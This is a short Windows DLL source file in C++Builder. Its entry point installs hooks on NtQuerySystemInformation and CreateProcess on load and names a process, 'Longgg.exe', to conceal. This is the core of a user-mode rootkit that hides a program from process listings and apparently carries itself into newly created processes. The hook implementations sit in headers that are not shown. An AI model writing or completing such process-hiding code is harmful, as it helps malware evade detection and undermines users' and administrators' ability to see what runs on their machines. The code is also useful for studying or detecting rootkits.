#include <vcl.h>
#include "Winternl.h"

HINSTANCE g_hinstDll;
AnsiString MyPath,CurrentProcessPath,HideProcessName ="Longgg.exe";

#include "MyFuction.h"
#include "Hook_CreateProcess.h"
#include "Hook_NtQSysInfo.h"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/*Dll Main*/
int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved){
	if(reason == DLL_PROCESS_ATTACH){
		g_hinstDll = hinst;
		MyPath = String(GetMyPath(hinst));
		CurrentProcessPath = (Application->ExeName);
		LauchNtQSysInfoHook();
		LauchCreateProcessHook();

	}else if(reason == DLL_PROCESS_DETACH){

	}
	return true;
}
